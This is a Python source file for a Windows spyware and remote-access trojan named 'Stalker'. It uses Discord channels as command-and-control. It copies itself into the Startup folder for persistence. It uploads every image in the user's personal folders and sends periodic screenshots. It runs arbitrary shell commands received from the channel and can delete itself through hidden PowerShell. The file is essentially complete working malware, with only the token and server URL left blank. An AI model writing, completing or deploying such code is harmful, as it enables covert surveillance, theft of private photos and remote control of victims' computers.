import os
import sys
import time
import shutil
import hashlib
import requests
import threading
import subprocess
from PIL import ImageGrab






class Stalker:
    def __init__(self):
        self.running = True

        # Discord token
        self.discord_token = "" 
        # Discord Server link
        self.DiscordServer_url = ""



        self.Shell_url = ""
        self.EveryImage_url = ""
        self.Screenshots_url = ""

        
        self.ShellDelay_sec = 10
        self.EveryImageDelay_sec = 1
        self.ScreenshotsDelay_sec = 60


        self.Username = os.getlogin()
        self.ProgramName = sys.argv[0].split("\\")[-1]
        # self.ScreenshotsImage_name = "image_MTI0NjE1MjgxMjA3Nzc3Njk2Ng.png"
        self.StartupFolder = os.path.expandvars("%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
        
        self.ImageExtensions = ('.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff')

        self.directories = [
            "Desktop",
            "Documents",
            "Downloads",
            "Favorites",
            "Links",
            "Music",
            "Pictures",
            "Saved Games",
            "Searches",
            "Videos"
        ]

        self.Headers = {"Authorization": self.discord_token}


    def is_file_in_startup(self):
        return sys.argv[0].startswith(self.StartupFolder)
    

    def suicide(self):
        ps_command = f"""
        Start-Sleep -Seconds {self.ShellDelay_sec + self.ScreenshotsDelay_sec + 15};
        Remove-Item -Force '{self.StartupFolder}\\{self.ProgramName}'
        """

        subprocess.Popen(['powershell', '-Command', ps_command], creationflags=subprocess.CREATE_NO_WINDOW)

        self.SendText("<shell>bye my friend :)", self.Shell_url)
        self.running = False


    def Shell(self):
        while self.running:
            try:
                time.sleep(self.ShellDelay_sec)
                res = requests.get(self.Shell_url + "?limit=1", headers=self.Headers)
                command = res.json()[0]["content"]

                if command == "quit":
                    self.running = False
                    self.SendText("<shell>bye my friend, hopefully i see u soon :)", self.Shell_url)
                elif command.startswith("suicide"):
                    self.suicide()
                elif command.startswith("<shell>"):
                    pass
                elif command.startswith("cd"):
                    os.chdir(command[3:])
                    self.SendText("<shell>" + command, self.Shell_url)
                elif len(command) > 0:
                    proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
                    stdout_value = proc.stdout.read() + proc.stderr.read()
                    if len(stdout_value) > 1900:
                        stdout_value = stdout_value[0:1900]

                    self.SendText((b"<shell>" + stdout_value).decode("cp850"), self.Shell_url)
            except:
                pass


    def SendImage(self, file_name, url):
        try:
            image_file = open(file_name, "rb")
            files = {'file': image_file}
            requests.post(url, headers=self.Headers, files=files)
            image_file.close()
        except:
            pass

    
    def SendText(self, text, url):
        data = {"content": text}
        requests.post(url, headers=self.Headers, data=data)


    def Screenshots(self):
        while self.running:
            time.sleep(self.ScreenshotsDelay_sec)
            screenshot = ImageGrab.grab()

            buffer = BytesIO()
            screenshot.save(buffer, format="PNG")
            buffer.seek(0)

            files = {'file': ("screenshot.png", buffer, "image/png")}
            requests.post(self.Screenshots_url, headers=self.Headers, files=files)
    

    def MakeACopy(self):
        shutil.copy(self.ProgramName, "NEW"+self.ProgramName)


    def MoveFile(self):
        shutil.move("NEW"+self.ProgramName, self.StartupFolder+"\\NEW"+self.ProgramName)


    def ReNameFile(self):
        os.rename(self.StartupFolder+"\\NEW"+self.ProgramName, self.StartupFolder+"\\"+self.ProgramName)


    def MoveProgramToStartUp(self):
        self.MakeACopy()
        self.MoveFile()
        self.ReNameFile()
    

    def SendEveryImage(self):
        self.SendText(f"every image from {self.Username}", self.EveryImage_url)

        for pp in self.directories:
            for root, _, files in os.walk(os.path.join(os.path.expanduser("~"), pp)):
                for file in files:
                    f = os.path.join(root, file)
                    if f.endswith(self.ImageExtensions):
                        # self.SendText(f, self.EveryImage_url)
                        self.SendImage(f, self.EveryImage_url)
                        time.sleep(self.EveryImageDelay_sec)


    def MakeChannel(self, name):
        payload = {
            # "guild_id": "1246153061517234236",
            "name": name,
            "type": 0
        }

        requests.post(self.DiscordServer_url, json=payload, headers=self.Headers)


    def MakeUrl(self, number):
        return f"https://discord.com/api/v9/channels/{number}/messages"


    def GiveChannelToVar(self):
        r = requests.get(self.DiscordServer_url, headers=self.Headers)

        for pp in r.json():
            if pp["type"] == 0:
                n = pp["name"]

                if n == f"{self.Username}-shell":
                    self.Shell_url = self.MakeUrl(pp["id"])
                elif n == f"{self.Username}-image":
                    self.EveryImage_url = self.MakeUrl(pp["id"])
                elif n == f"{self.Username}-screen":
                    self.Screenshots_url = self.MakeUrl(pp["id"])

    
    def FindChannelUrl(self):
        r = requests.get(self.DiscordServer_url, headers=self.Headers)
        con = r.content.decode("utf-8")

        if con.find(f"{self.Username}-shell") == -1:
            self.MakeChannel(f"{self.Username}-shell")

        if con.find(f"{self.Username}-image") == -1:
            self.MakeChannel(f"{self.Username}-image")

        if con.find(f"{self.Username}-screen") == -1:
            self.MakeChannel(f"{self.Username}-screen")

        self.GiveChannelToVar()


    def start(self):
        if self.is_file_in_startup():
            self.FindChannelUrl()
            threading.Thread(target=self.Screenshots).start()
            self.Shell()
        
        else:
            self.FindChannelUrl()
            self.MoveProgramToStartUp()
            self.SendEveryImage()
            threading.Thread(target=self.Screenshots).start()
            self.Shell()

Stalker().start()
